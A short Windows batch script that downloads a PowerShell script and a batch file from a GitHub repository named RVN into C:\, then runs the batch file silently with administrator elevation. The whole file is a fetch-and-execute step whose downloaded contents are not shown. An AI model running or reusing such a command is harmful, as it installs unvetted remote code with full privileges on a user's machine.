@echo off
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/RVN/refs/heads/main/RVN_SETUP.ps1' -OutFile 'C:\RVN_SETUP.ps1'"
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/RVN/refs/heads/main/RUNSYS_RVN.bat' -OutFile 'C:\RUNSYS_RVN.bat'"
powershell -NoProfile -Command "Start-Process -FilePath 'C:\RUNSYS_RVN.bat' -ArgumentList '/S' -Verb RunAs"
exit